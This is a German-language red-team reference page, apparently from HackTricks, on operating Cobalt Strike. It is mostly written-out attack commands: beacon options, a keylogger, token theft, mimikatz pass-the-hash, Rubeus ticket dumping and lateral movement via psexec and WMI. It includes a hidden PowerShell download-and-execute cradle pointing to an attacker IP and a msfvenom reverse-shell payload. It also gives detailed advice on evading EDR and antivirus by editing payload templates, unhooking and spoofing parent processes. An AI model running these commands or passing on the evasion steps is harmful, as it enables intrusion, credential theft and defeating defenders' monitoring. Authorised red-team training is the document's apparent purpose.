# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` dann kannst du auswählen, wo zu lauschen ist, welche Art von beacon verwendet werden soll (http, dns, smb...) und mehr.

### Peer2Peer Listeners

Die beacons dieser Listeners müssen nicht direkt mit dem C2 kommunizieren; sie können über andere beacons mit ihm kommunizieren.

`Cobalt Strike -> Listeners -> Add/Edit` dann musst du die TCP- oder SMB-beacons auswählen

* Die **TCP beacon setzt einen listener auf dem ausgewählten Port**. Um dich mit einer TCP beacon zu verbinden, verwende den Befehl `connect <ip> <port>` von einer anderen beacon
* Die **smb beacon wird in einem pipename mit dem ausgewählten Namen lauschen**. Um dich mit einer SMB beacon zu verbinden, musst du den Befehl `link [target] [pipe]` verwenden.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Macro
* **`Windows Executable`** für eine .exe, .dll oder service .exe
* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder service .exe (besser stageless als staged, weniger IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dies erzeugt ein Skript/Executable, um den beacon von cobalt strike herunterzuladen, in Formaten wie: bitsadmin, exe, powershell und python

#### Host Payloads

Wenn du die Datei, die du hosten möchtest, bereits auf einem Webserver hast, gehe einfach zu `Attacks -> Web Drive-by -> Host File` und wähle die Datei sowie die Webserver-Konfiguration aus.

### Beacon Options

<details>
<summary>Beacon Optionen und Befehle</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ein custom agent muss nur das Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) sprechen, um sich zu registrieren/check-in und Aufgaben zu empfangen. Implementiere die gleichen URIs/headers/metadata crypto, die im Profil definiert sind, um die Cobalt Strike UI für Tasking und Output wiederzuverwenden.
- Ein Aggressor Script (z. B. `CustomBeacon.cna`) kann die Payload-Generierung für den non-Windows beacon kapseln, sodass Operatoren den Listener auswählen und ELF-Payloads direkt aus der GUI erzeugen können.
- Beispielhafte Linux-Task-Handler, die dem Team Server exponiert werden: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download` und `exit`. Diese mappen auf Task-IDs, die vom Team Server erwartet werden, und müssen serverseitig implementiert werden, um Output im korrekten Format zurückzugeben.
- BOF support auf Linux kann hinzugefügt werden, indem Beacon Object Files im Prozess mit [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) geladen werden (unterstützt auch Outflank-style BOFs), was modulare post-exploitation im Kontext/mit den Privilegien des implants erlaubt, ohne neue Prozesse zu spawnen.
- Bette einen SOCKS-Handler in den custom beacon ein, um Pivoting-Parität mit Windows Beacons zu erhalten: wenn der Operator `socks <port>` ausführt, sollte das implant einen lokalen Proxy öffnen, um Operator-Tooling über den kompromittierten Linux-Host in interne Netzwerke zu routen.

## Opsec

### Execute-Assembly

Der **`execute-assembly`** verwendet einen **sacrificial process** mittels remote process injection, um das angegebene Programm auszuführen. Das ist sehr noisy, da beim Injizieren in einen Prozess bestimmte Win APIs verwendet werden, die jedes EDR überwacht. Es gibt jedoch einige custom Tools, die verwendet werden können, um etwas im selben Prozess zu laden:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kannst du auch BOF (Beacon Object Files) nutzen: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Das agressor script `https://github.com/outflanknl/HelpColor` erstellt den `helpx`-Befehl in Cobalt Strike, der Befehle einfärbt, um anzuzeigen, ob sie BOFs (grün), Frok&Run (gelb) und ähnliches sind oder ProcessExecution, injection oder ähnliches (rot). Das hilft einzuschätzen, welche Befehle stealthier sind.

### Act as the user

Du könntest Events wie `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` prüfen:

- Security EID 4624 - Prüfe alle interaktiven Logons, um die üblichen Betriebszeiten zu kennen.
- System EID 12,13 - Prüfe die Häufigkeit von Shutdown/Startup/Sleep.
- Security EID 4624/4625 - Prüfe eingehende gültige/ungültige NTLM-Versuche.
- Security EID 4648 - Dieses Event wird erstellt, wenn plaintext credentials zum Logon verwendet werden. Wenn ein Prozess es erzeugt hat, könnte die Binary die Credentials im Klartext in einer Konfigurationsdatei oder im Code enthalten.

Beim Einsatz von `jump` aus Cobalt Strike ist es besser, die `wmi_msbuild`-Methode zu verwenden, damit der neue Prozess legitimer aussieht.

### Use computer accounts

Es ist üblich, dass Verteidiger merkwürdiges Verhalten von Nutzern prüfen und **Service-Accounts und Computer-Accounts wie `*$` von ihrer Überwachung ausschließen**. Du könntest diese Accounts für Lateral Movement oder Privilege Escalation verwenden.

### Use stageless payloads

Stageless payloads sind weniger noisy als staged, weil sie keine zweite Stage vom C2 herunterladen müssen. Das bedeutet, dass nach der initialen Verbindung kein weiterer Netzwerktraffic erzeugt wird, wodurch sie weniger wahrscheinlich von netzwerkbasierten Defenses erkannt werden.

### Tokens & Token Store

Sei vorsichtig beim Stehlen oder Erzeugen von Tokens, weil es möglich ist, dass ein EDR alle Tokens aller Threads enumeriert und ein **Token findet, das zu einem anderen Benutzer** oder sogar SYSTEM im Prozess gehört.

Es ist sinnvoll, Tokens **per beacon** zu speichern, sodass es nicht nötig ist, dasselbe Token immer wieder zu stehlen. Das ist nützlich für Lateral Movement oder wenn du ein gestohlenes Token mehrfach verwenden musst:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Beim lateralen Vorgehen ist es meistens besser, **ein Token zu stehlen als ein neues zu generieren** oder einen pass-the-hash-Angriff durchzuführen.

### Guardrails

Cobalt Strike hat eine Funktion namens **Guardrails**, die hilft, die Nutzung bestimmter Befehle oder Aktionen zu verhindern, die von Verteidigern entdeckt werden könnten. Guardrails können so konfiguriert werden, dass spezifische Commands blockiert werden, wie z. B. `make_token`, `jump`, `remote-exec` und andere, die üblicherweise für Lateral Movement oder Privilege Escalation verwendet werden.

Außerdem enthält das Repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) einige Checks und Ideen, die du vor der Ausführung eines Payloads berücksichtigen könntest.

### Tickets encryption

In einer AD-Umgebung sei vorsichtig mit der Verschlüsselung der Tickets. Standardmäßig verwenden einige Tools RC4-Verschlüsselung für Kerberos-Tickets, was weniger sicher als AES ist; in aktuellen Umgebungen wird standardmäßig AES verwendet. Das kann von Verteidigern entdeckt werden, die nach schwachen Verschlüsselungsalgorithmen überwachen.

### Avoid Defaults

Bei der Verwendung von Cobalt Strike haben die SMB-Pipes standardmäßig Namen wie `msagent_####` und `status_####`. Ändere diese Namen. Es ist möglich, die Namen der existierenden Pipes in Cobalt Strike mit dem Befehl `ls \\.\pipe\` zu prüfen.

Außerdem wird bei SSH-Sessions eine Pipe namens `\\.\pipe\postex_ssh_####` erstellt. Ändere sie mit `set ssh_pipename "<new_name>";`.

Auch bei postex exploitation attacks können die Pipes `\\.\pipe\postex_####` mit `set pipename "<new_name>"` angepasst werden.

In Cobalt Strike profiles kannst du außerdem Dinge anpassen wie:

- Avoiding using `rwx`
- Wie das process injection Verhalten funktioniert (welche APIs genutzt werden) im `process-inject {...}` Block
- Wie "fork and run" im `post-ex {…}` Block funktioniert
- Die sleep time
- Die max size von Binaries, die in den Speicher geladen werden dürfen
- Den memory footprint und DLL-Inhalt im `stage {...}` Block
- Den network traffic

### Bypass memory scanning

Einige EDRs scannen den Speicher nach bekannten Malware-Signaturen. Cobalt Strike erlaubt es, die `sleep_mask`-Funktion als BOF zu modifizieren, die in der Lage ist, die backdoor im Speicher zu verschlüsseln.

### Noisy proc injections

Beim Injizieren von Code in einen Prozess ist das in der Regel sehr noisy, weil normalerweise kein regulärer Prozess diese Aktion ausführt und die Methoden dafür sehr begrenzt sind. Daher kann es von verhaltensbasierten Detection-Systemen erkannt werden. Außerdem können EDRs das Netzwerk nach Threads scannen, die Code enthalten, der nicht auf der Festplatte liegt (obwohl Prozesse wie Browser mit JIT das häufiger tun). Beispiel: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Beim Erzeugen eines neuen Prozesses ist es wichtig, eine reguläre parent-child-Beziehung zwischen Prozessen zu wahren, um Erkennung zu vermeiden. Wenn svchost.exe iexplorer.exe startet, wirkt das verdächtig, da svchost.exe im normalen Windows keine Parent von iexplorer.exe ist.

Wenn ein neuer beacon in Cobalt Strike gespawnt wird, wird standardmäßig ein Prozess mit **`rundll32.exe`** erstellt, um den neuen Listener auszuführen. Das ist nicht sehr stealthy und kann leicht von EDRs entdeckt werden. Zudem wird `rundll32.exe` ohne Argumente ausgeführt, was es noch verdächtiger macht.

Mit folgendem Cobalt Strike-Befehl kannst du einen anderen Prozess angeben, um den neuen beacon zu spawnen und ihn weniger detectible zu machen:
```bash
spawnto x86 svchost.exe
```
Du kannst auch diese Einstellung **`spawnto_x86` und `spawnto_x64`** in einem Profil ändern.

### Weiterleitung von Angreifer-Traffic

Angreifer müssen manchmal in der Lage sein, Tools lokal auszuführen, sogar auf Linux-Maschinen, und den Traffic der Opfer so zu routen, dass er das Tool erreicht (z. B. NTLM relay).

Außerdem ist es manchmal für den Angreifer beim Durchführen eines pass-the.hash- oder pass-the-ticket-Angriffs unauffälliger, **diesen Hash oder das Ticket lokal in seinen eigenen LSASS-Prozess einzufügen** und davon aus zu pivotieren, statt den LSASS-Prozess einer Opfermaschine zu verändern.

Du musst jedoch **vorsichtig mit dem erzeugten Traffic** sein, da du möglicherweise ungewöhnlichen Traffic (Kerberos?) aus deinem backdoor-Prozess verschickst. Dafür könntest du auf einen Browserprozess pivotieren (wobei du beim Injizieren in einen Prozess entdeckt werden könntest — denk also an eine unauffällige Methode dafür).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Siehe Seite:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalerweise findest du in `/opt/cobaltstrike/artifact-kit` den Code und die vorkompilierten Templates (in `/src-common`) der Payloads, die cobalt strike zur Erzeugung der Binary-Beacons verwendet.

Wenn du [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) mit dem erzeugten backdoor (oder nur mit dem kompilierten Template) verwendest, kannst du herausfinden, was Defender auslöst. Meistens ist es ein String. Daher kannst du einfach den Code anpassen, der das backdoor erzeugt, sodass dieser String im finalen Binary nicht mehr auftaucht.

Nachdem du den Code angepasst hast, führe einfach `./build.sh` im selben Verzeichnis aus und kopiere den Ordner `dist-pipe/` in den Windows-Client nach `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Vergiss nicht, das aggressive Skript `dist-pipe\artifact.cna` zu laden, um Cobalt Strike anzuweisen, die Ressourcen von der Festplatte zu verwenden, die wir möchten, und nicht die bereits geladenen.

#### Ressourcen-Kit

Der ResourceKit-Ordner enthält die Vorlagen für die skriptbasierten Payloads von Cobalt Strike, einschließlich PowerShell, VBA und HTA.

Wenn du [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) mit den Vorlagen verwendest, kannst du herausfinden, was der Defender (AMSI in diesem Fall) nicht mag, und es entsprechend anpassen:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Wenn man die erkannten Zeilen verändert, kann man eine Vorlage erzeugen, die nicht erkannt wird.

Vergiss nicht, das aggressive Script `ResourceKit\resources.cna` zu laden, damit Cobalt Strike die Ressourcen von der Festplatte verwendet, die wir wollen, und nicht die bereits geladenen.

#### Function hooks | Syscall

Function hooking ist eine sehr häufige Methode von ERDs, um bösartige Aktivität zu erkennen. Cobalt Strike ermöglicht es, diese Hooks zu umgehen, indem es **syscalls** statt der standardmäßigen Windows API-Aufrufe mit der **`None`**-Konfiguration verwendet, oder die `Nt*`-Version einer Funktion mit der **`Direct`**-Einstellung nutzt, oder einfach über die `Nt*`-Funktion mit der **`Indirect`**-Option im malleable profile springt. Je nach System kann eine Option unauffälliger sein als die andere.

Das kann im profile eingestellt oder mit dem Befehl **`syscall-method`** gesetzt werden.

Allerdings kann das auch auffällig sein.

Eine von Cobalt Strike bereitgestellte Möglichkeit, um function hooks zu umgehen, ist, diese Hooks zu entfernen mit: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Du kannst außerdem prüfen, welche Funktionen gehookt sind, mit [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) oder [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Verschiedene Cobalt Strike-Befehle</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referenzen

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 Analyse der Cobalt Strike-Metadatenverschlüsselung](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary über Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
